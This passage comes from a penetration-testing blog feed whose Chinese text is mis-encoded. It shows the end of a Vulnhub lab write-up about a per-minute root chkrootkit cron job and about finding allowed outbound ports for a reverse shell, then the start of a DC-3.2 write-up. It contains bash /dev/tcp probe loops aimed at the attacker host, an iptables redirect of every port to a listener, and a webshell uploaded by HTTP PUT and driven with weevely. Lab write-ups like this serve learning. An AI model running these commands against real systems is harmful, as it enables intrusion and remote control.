title="3ã€chkrootkit"></a>3ã€chkrootkit</h3><blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/elephantxiang/article/details/122463492">https://blog.csdn.net/elephantxiang/article/details/122463492</a></p></blockquote><p>çªç„¶æœ‰ä¸ªç–‘æƒ‘ï¼Œchkrootkit ä¸æ˜¯æ¯å¤©æ‰§è¡Œä¸€æ¬¡å—ï¼Ÿä¸ºä»€ä¹ˆåˆ›å»º update æ²¡å¤šä¹…å°±å¯ä»¥å®ç°ææƒäº† ï¼Ÿæœ€ç»ˆåœ¨ä¸€ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°ç­”æ¡ˆã€‚</p><p>çœ‹äº†ä¸€ä¸‹ <code>/etc/cron.daily/chkrootkit</code> çš„å†…å®¹ï¼Œé…åˆ <code>/etc/chkrootkit.conf</code> æ–‡ä»¶ï¼Œå‘ç° <code>/etc/cron.daily/chkrootkit</code> å®é™…ä¸Šæ ¹æœ¬ä¸ä¼šè¢«æ‰§è¡Œ ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /etc/cron.daily/chkrootkit</span><br><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br><br>set -e<br><br>CHKROOTKIT=/usr/sbin/chkrootkit<br>CF=/etc/chkrootkit.conf<br>LOG_DIR=/var/log/chkrootkit<br><br>if [ &quot;$RUN_DAILY&quot; = &quot;true&quot; ]; then<br>    if [ &quot;$DIFF_MODE&quot; = &quot;true&quot; ]; then<br>                                eval $CHKROOTKIT $RUN_DAILY_OPTS &gt; $LOG_DIR/log.today.raw 2&gt;&amp;1<br><br>[......]<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /etc/chkrootkit.conf</span><br>RUN_DAILY=&quot;false&quot;<br>RUN_DAILY_OPTS=&quot;-q&quot;<br>DIFF_MODE=&quot;false&quot;<br></code></pre></td></tr></table></figure><p>çªç„¶æƒ³èµ·æ¥ï¼Œææƒä¹‹å‰ <code>/etc/cron.d</code> æ˜¯æ²¡æœ‰æƒé™æŸ¥çœ‹çš„ï¼Œåœ¨ root æƒé™ä¸‹æŸ¥çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l /etc/cron.d</span><br>total 8<br>-rwx------ 1 root root  36 Apr 12  2016 chkrootkit<br>-rwx------ 1 root root 544 Oct 27  2015 php5<br><span class="hljs-meta">$</span><span class="bash">cat /etc/cron.d/chkrootkit</span><br>* * * * * root /usr/sbin/chkrootkit<br></code></pre></td></tr></table></figure><p>å‘ç° <code>/etc/cron.d</code> ä¸‹é¢è¿˜æœ‰ä¸ª chkrootkit ï¼Œæœç„¶æ˜¯è¿™è´§åœ¨æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ chkrootkit ã€‚</p><h3 id="4ã€å‡ºç«™ç«¯å£å—é™"><a href="#4ã€å‡ºç«™ç«¯å£å—é™" class="headerlink" title="4ã€å‡ºç«™ç«¯å£å—é™"></a>4ã€å‡ºç«™ç«¯å£å—é™</h3><blockquote><p><a href="https://blog.51cto.com/u_15127601/2756621">ç…§å¼¹ä¸è¯¯ï¼šå‡ºç«™ç«¯å£å—é™ç¯å¢ƒä¸‹åå¼¹Shellçš„æ€è€ƒ</a></p></blockquote><p>è™½ç„¶è¯•äº†å‡ ä¸ªç«¯å£åæ‰¾åˆ°äº†å¯ä»¥å…è®¸å‡ºç«™çš„ç«¯å£ï¼Œä½†å¦‚æœä¸æ˜¯ 8080 è¿™ç§å¸¸ç”¨çš„ç‰¹æ®Šç«¯å£ï¼Œè€Œæ˜¯ä¾‹å¦‚ 15682 è¿™ç§ç«¯å£ï¼Œé€šè¿‡å‡ æ¬¡å°è¯•è‚¯å®šæ‰¾ä¸åˆ°ï¼Œè¿˜æ˜¯è¦æƒ³ä¸ªæ–¹æ³•æ¥æ‰¾åˆ°ä¸€ä¸ªå¯ç”¨çš„ç«¯å£ã€‚</p><h4 id="æ‰¹é‡ç«¯å£æ¢æµ‹"><a href="#æ‰¹é‡ç«¯å£æ¢æµ‹" class="headerlink" title="æ‰¹é‡ç«¯å£æ¢æµ‹"></a>æ‰¹é‡ç«¯å£æ¢æµ‹</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;80,81&#125;; <span class="hljs-keyword">do</span> timeout 1 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> open&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> close&quot;</span>;<span class="hljs-keyword">done</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;80..83&#125;; <span class="hljs-keyword">do</span> timeout 1 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> open&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> close&quot;</span>;<span class="hljs-keyword">done</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> ((i=80;<span class="hljs-variable">$i</span>&lt;83;i++)); <span class="hljs-keyword">do</span> timeout 1 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> open&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> close&quot;</span>;<span class="hljs-keyword">done</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(seq 80 83); <span class="hljs-keyword">do</span> timeout 1 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> open&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$i</span> close&quot;</span>;<span class="hljs-keyword">done</span></span><br></code></pre></td></tr></table></figure><h4 id="æ‰¹é‡æ†ç»‘ç›‘å¬ç«¯å£"><a href="#æ‰¹é‡æ†ç»‘ç›‘å¬ç«¯å£" class="headerlink" title="æ‰¹é‡æ†ç»‘ç›‘å¬ç«¯å£"></a>æ‰¹é‡æ†ç»‘ç›‘å¬ç«¯å£</h4><blockquote><p>å¦‚æœèƒ½å¤ŸæŠŠå¤šä¸ªç«¯å£æµé‡è½¬å‘è‡³å•ä¸ªæ±‡èšç«¯å£ï¼Œå°±åªéœ€ç›‘å¬å•ä¸ªæ±‡èšç«¯å£ï¼Œç›®æ ‡ä¸Šå‘èµ·å¤šä¸ªç«¯å£æ¢æµ‹ï¼Œåªè¦åœ¨è½¬å‘çš„å¤šä¸ªç«¯å£çš„èŒƒå›´å†…ï¼Œé‚£ä¹ˆï¼Œä¸€æ—¦æ‰¾åˆ°æœ‰æ•ˆå‡ºç«™ç«¯å£ï¼Œæ±‡èšç«¯å£ä¸€å®šæœ‰è®¿é—®è®°å½•ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> é‡å¯ä¹‹åè®¾ç½®å¤±æ•ˆï¼Œä¸ç”¨è‡ªå·±è¿›è¡Œå¤‡ä»½å’Œæ¢å¤, è®¾ç½®å°±ä¼šæ¢å¤</span> <br><span class="hljs-meta">#</span><span class="bash"> sudo iptables-save &gt; /tmp/firwall.rules</span><br><span class="hljs-meta">#</span><span class="bash"> sudo iptables-restore &lt; /tmp/firwall.rules</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="hljs-meta">$</span><span class="bash"> sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 4444</span><br></code></pre></td></tr></table></figure><h4 id="è¿›è¡Œæµ‹è¯•"><a href="#è¿›è¡Œæµ‹è¯•" class="headerlink" title="è¿›è¡Œæµ‹è¯•"></a>è¿›è¡Œæµ‹è¯•</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lvp 80</span>                                                                              <br>listening on [any] 80 ...<br>^C<br><br>wzz@ubuntu:~$ for i in &#123;80,81&#125;; do timeout 1 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot; &amp;&amp; echo &quot;$i open&quot; || echo &quot;$i close&quot;;done<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/80: Connection refused<br>80 close<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/81: Connection refused<br>81 close<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nc -lvp 4444</span><br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from 192.168.135.135 [192.168.135.135] 50430<br><br>wzz@ubuntu:~$ for i in &#123;80,81&#125;; do timeout 1 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot; &amp;&amp; echo &quot;$i open&quot; || echo &quot;$i close&quot;;done<br>80 open<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/81: Connection refused<br>81 close<br></code></pre></td></tr></table></figure><p>æˆåŠŸå®ç°ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç›´æ¥ä¸Šé¶æœºè¿›è¡Œæ¢æµ‹</p><h4 id="é¶æœºæ¢æµ‹"><a href="#é¶æœºæ¢æµ‹" class="headerlink" title="é¶æœºæ¢æµ‹"></a>é¶æœºæ¢æµ‹</h4><p>ä¸ºæ–¹ä¾¿æ“ä½œï¼Œä¸Šä¼ æœ¨é©¬ï¼Œç”¨ weevely è¿›è¡Œè¿æ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v -H <span class="hljs-string">&#x27;Expect:&#x27;</span> -T hello.php http://192.168.135.154/<span class="hljs-built_in">test</span>/</span><br>*   Trying 192.168.135.154:80...<br>* Connected to 192.168.135.154 (192.168.135.154) port 80 (#0)<br><span class="hljs-meta">&gt;</span><span class="bash"> PUT /<span class="hljs-built_in">test</span>/hello.php HTTP/1.1</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Host: 192.168.135.154</span><br><span class="hljs-meta">&gt;</span><span class="bash"> User-Agent: curl/7.83.0</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Accept: */*</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Content-Length: 744</span><br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>* We are completely uploaded and fine<br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 201 Created<br>&lt; Content-Length: 0<br>&lt; Date: Mon, 04 Jul 2022 15:43:44 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>* Connection #0 to host 192.168.135.154 left intact<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> weevely http://192.168.135.154/<span class="hljs-built_in">test</span>/hello.php <span class="hljs-built_in">test</span></span><br><br>[+] weevely 4.0.1<br><br>[+] Target:     www-data@ubuntu:/var/www/test<br>[+] Session:    /home/kali/.weevely/sessions/192.168.135.154/hello_0.session<br>[+] Shell:      System shell<br><br>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.<br><span class="hljs-meta"></span><br><span class="hljs-meta">weevely&gt;</span><span class="bash"> ls</span><br>hello.php<br>php-reverse-shell.php<br>wzz.php<br>wzz1.sh<br>wzz2.sh<br>wzz3.sh<br></code></pre></td></tr></table></figure><p>ä¹‹å‰å·²ç»æµ‹è¯•å¾—åˆ°äº† 8080 ç«¯å£æ˜¯å¯ä»¥åå¼¹çš„ï¼Œç°åœ¨è¿›è¡Œæµ‹è¯•ï¼š</p><p>kali ç«¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lvp 4444</span><br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from 192.168.135.135 [192.168.135.135] 50430<br></code></pre></td></tr></table></figure><p>é¶æœºç«¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@ubuntu:/var/www/test $ for i in $(seq 8079 8081); do timeout 1 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot; &amp;&amp; echo &quot;$i open&quot; || echo &quot;$i close&quot;;done<br>8079 close<br>8080 open<br>8081 close<br>www-data@ubuntu:/var/www/test $ for i in $(seq 8079 8081); do timeout 1 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot; &amp;&amp; echo &quot;$i open&quot; || echo &quot;$i close&quot;;done<br>8079 close<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/8080: Connection refused<br>8080 close<br>8081 close<br></code></pre></td></tr></table></figure><p>åœ¨æµ‹è¯•ä¸­å‘ç°ï¼Œå¯èƒ½ç”±äºé˜²ç«å¢™çš„åŸå› ï¼Œå¦‚æœ kali ä¸è¿›è¡Œç›‘å¬ï¼Œåœ¨æ¢æµ‹å…è®¸å‡ºç«™çš„ç›®çš„ç«¯å£æ—¶ï¼Œé‚£ä¹ˆä¼šå‡ºç° <code>Connection refused</code> çš„æç¤ºï¼Œè€Œåœ¨æ¢æµ‹ä¸å…è®¸å‡ºç«™çš„ç›®çš„ç«¯å£æ—¶ï¼Œå´ä¸ä¼šæ˜¾ç¤ºã€‚</p><p>è¿™æ ·çš„è¯ï¼Œå°±å¯ä»¥ç›´æ¥æ¢æµ‹ï¼Œkali ä¸ç”¨ç›‘å¬ï¼Œå‡ºç°é”™è¯¯çš„ç«¯å£å°±æ˜¯å…è®¸å‡ºç«™çš„ç›®çš„ç«¯å£ ã€‚</p><p>å¯¹æ¢æµ‹è¯­å¥è¿›è¡Œä¿®æ”¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(seq 1 65535); <span class="hljs-keyword">do</span> timeout 0.01 bash -c <span class="hljs-string">&quot;echo &gt;  /dev/tcp/192.168.135.141/<span class="hljs-variable">$i</span>&quot;</span>;<span class="hljs-keyword">done</span></span><br></code></pre></td></tr></table></figure><p>é¶æœºæ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@ubuntu:/var/www/test $ for i in $(seq 1 65535); do timeout 0.01 bash -c &quot;echo &gt;  /dev/tcp/192.168.135.141/$i&quot;;done<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/443: Connection refused<br>bash: connect: Connection refused<br>bash: /dev/tcp/192.168.135.141/8080: Connection refused<br></code></pre></td></tr></table></figure><p>æˆåŠŸå¾—åˆ°ä¸¤ä¸ªå¯ä»¥å‡ºç«™çš„ç«¯å£ ã€‚</p><p>æŸ¥çœ‹é˜²ç«å¢™æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls /root</span><br>304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz<br>7d03aaa2bf93d80040f3f22ec6ad9d5a.txt<br>chkrootkit-0.49<br>newRule<br><span class="hljs-meta">$</span><span class="bash"> cat /root/newRule</span><br><span class="hljs-meta">#</span><span class="bash"> Generated by iptables-save v1.4.12 on Mon Apr 25 22:48:24 2016</span><br>*filter<br>:INPUT DROP [0:0]<br>:FORWARD ACCEPT [0:0]<br>:OUTPUT DROP [0:0]<br>-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT<br>-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT<br>-A INPUT -p tcp -m tcp --sport 8080 -j ACCEPT<br>-A INPUT -p tcp -m tcp --sport 443 -j ACCEPT<br>-A OUTPUT -p tcp -m tcp --sport 22 -j ACCEPT<br>-A OUTPUT -p tcp -m tcp --sport 80 -j ACCEPT<br>-A OUTPUT -p tcp -m tcp --dport 8080 -j ACCEPT<br>-A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT<br>COMMIT<br><span class="hljs-meta">#</span><span class="bash"> Completed on Mon Apr 25 22:48:24 2016</span><br></code></pre></td></tr></table></figure><p>æ²¡æ¯›ç—…ï¼Œå…è®¸å‡ºç«™çš„ç›®çš„ç«¯å£å…¨éƒ¨æ‰¾åˆ°ï¼Œä½†ä¹Ÿçš„ç¡®å¤ªè€—æ—¶é—´äº†ï¼Œè¿™é‡Œæ˜¯ä¸ºäº†æµ‹è¯•è¿™ç§æ–¹æ³•çš„æ­£ç¡®æ€§è¿›è¡Œäº†å…¨éƒ¨æµ‹è¯•ï¼ŒçœŸæ­£ä½¿ç”¨æ—¶åªéœ€æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥å‡ºç«™çš„ç«¯å£å°±å¯ä»¥äº†ï¼Œä¸ç”¨è¿›è¡Œå…¨éƒ¨ç«¯å£çš„æ¢æµ‹ï¼Œå¯ä»¥ä¾ç…§ â€œé‡è¦ç¨‹åº¦â€ åˆ†æ‰¹æ¬¡å¯¹ç«¯å£è¿›è¡Œæ¢æµ‹ï¼Œâ€é‡è¦ç¨‹åº¦â€ å¯ä»¥å‚ç…§ nmap çš„è§„åˆ™ã€‚</p><h4 id="çŒœæµ‹çš„ç«¯å£èŒƒå›´"><a href="#çŒœæµ‹çš„ç«¯å£èŒƒå›´" class="headerlink" title="çŒœæµ‹çš„ç«¯å£èŒƒå›´"></a>çŒœæµ‹çš„ç«¯å£èŒƒå›´</h4><p>ç›®æ ‡æ—¢ç„¶å…è®¸è®¿é—®å¤–éƒ¨çš„å‡ ä¸ªç«¯å£ï¼Œä¸€å®šæ˜¯é‚£äº›ç«¯å£æä¾›ç›®æ ‡æ‰€éœ€æœåŠ¡ï¼Œé‚£ä¹ˆï¼Œæˆ‘æ²¡å¿…è¦ä¸€å¼€å§‹å°±åˆ° [1, 65535] ä¸­å»æ‰¾æœ‰æ•ˆç«¯å£ï¼Œè€Œæ˜¯æ ¹æ®æœåŠ¡çš„å¸¸è§ç¨‹åº¦ï¼Œå°†æ‰€æœ‰ç«¯å£åˆ’ä¸ºå‡ ä¸ªå±‚æ¬¡ï¼Œä¾æ¬¡é€å±‚çŒœè§£ã€‚</p><p>ç¬¬ä¸€å±‚ï¼Œæœ€å¸¸è§ç«¯å£ã€‚ç»éªŒæ¥çœ‹ï¼ŒDNS çš„ 53ã€HTTP æœåŠ¡çš„é»˜è®¤ç«¯å£ 80ã€HTTPS çš„ 443 æ˜¯ä¸‰ä¸ªæœ€å¸¸è§çš„å‡ºç«™ç«¯å£ã€‚</p><p>ç¬¬äºŒå±‚ï¼Œè¾ƒå¸¸è§ç«¯å£ã€‚å¤§æ¦‚åŒ…æ‹¬å¦‚ä¸‹å‡ ç±»ï¼š</p><ul><li><p>web æœåŠ¡ï¼Œ HTTP çš„ 80ã€HTTPS çš„ 443ï¼›</p></li><li><p>ä¸­é—´ä»¶æœåŠ¡ï¼Œweblogic çš„ 7001/7002ã€webshpere çš„ 9080/9090ã€jboss çš„ 8080ï¼›</p></li><li>è¿œç¨‹ç®¡ç†æœåŠ¡ï¼ŒSSH çš„ 22ã€telnet çš„ 23ã€SNMP çš„ 161ã€RDP çš„ 3389ï¼›</li><li>æ•°æ®ä¼ è¾“æœåŠ¡ï¼ŒFTP çš„ 21ã€SCP/SFTP çš„ 22ã€SMB çš„ 137/138/139/445ï¼›</li><li>æ•°æ®åº“æœåŠ¡ï¼Œmssql çš„ 1433ã€mysql çš„ 3306ã€oracle çš„ 1521ã€LDAP çš„ 389ï¼›</li><li>ç¼“å­˜æœåŠ¡ï¼Œredis çš„ 6379ã€memcached çš„ 11211ï¼›</li><li>é‚®ä»¶æœåŠ¡ï¼ŒSMTP çš„ 25ã€POP3 çš„ 110ã€IMAP çš„ 143ï¼›</li><li>å…¶ä»–æœåŠ¡ï¼ŒDNS çš„ 53ã€NTP çš„ 123ã€kerberos çš„ 88ï¼›</li></ul><p>ç¬¬ä¸‰å±‚ï¼Œtop100 å¸¸è§ç«¯å£ã€‚nmap é»˜è®¤æ‰«æ top1000 å¸¸è§ç«¯å£ï¼Œé€šè¿‡ â€”top-ports é€‰é¡¹å¯ä»¥æŒ‡å®šæ‰«ææ›´å¤šå¸¸è§ç«¯å£ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œnmap å†…éƒ¨æ¢³ç†äº†ä¸€ä»½å·²çŸ¥æœåŠ¡é»˜è®¤ç«¯å£åˆ—è¡¨ï¼Œå¹¶ä¸”è¿˜èƒ½æŒ‰å¸¸è§ç¨‹åº¦æ’åºï¼Œç®€ç›´å·´é€‚ï¼Œè¦è·å– top100 å¸¸è§ç«¯å£ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -n --top-ports 100 127.0.0.1 -oA foo &gt; /dev/null</span><br><span class="hljs-meta">$</span><span class="bash"> grep -i <span class="hljs-string">&quot;services\=&quot;</span> foo.xml | sed -r <span class="hljs-string">&#x27;s/.*services\=\&quot;(.*)(\&quot;\/&gt;)/\1/g&#x27;</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nmap -n --top-ports 100 127.0.0.1 -oA foo &gt; /dev/null</span><br><span class="hljs-meta">$</span><span class="bash"> grep -i <span class="hljs-string">&quot;services\=&quot;</span> foo.xml | sed -r <span class="hljs-string">&#x27;s/.*services\=\&quot;(.*)(\&quot;\/&gt;)/\1/g&#x27;</span></span><br>7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157<br></code></pre></td></tr></table></figure><p>é‡‡ç”¨ç›¸åŒæ€è·¯ï¼Œæˆ‘å¯ä»¥æŒç»­æ¢æµ‹ top200ã€top400 å¸¸è§ç«¯å£ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DCï¼š3.2</title>
    <link href="/2022/07/03/Penetration/Vulnhub/Part-1/0x06%20DC-3/"/>
    <url>/2022/07/03/Penetration/Vulnhub/Part-1/0x06%20DC-3/</url>
    
    <content type="html"><![CDATA[<h1 id="0x06-DC-3-2-vulnhub"><a href="#0x06-DC-3-2-vulnhub" class="headerlink" title="0x06 DC: 3.2~vulnhub"></a>0x06 DC: 3.2~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/dc-32,312/">DC: 3.2 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.153</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24    <span class="hljs-comment"># æ‰«æè¯¥ç½‘æ®µä¸Šæ´»è·ƒçš„ä¸»æœº</span></span><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.153</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.153</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-03 08:42 EDT<br>Nmap scan report for 192.168.135.153 (192.168.135.153)<br>Host is up (0.00053s 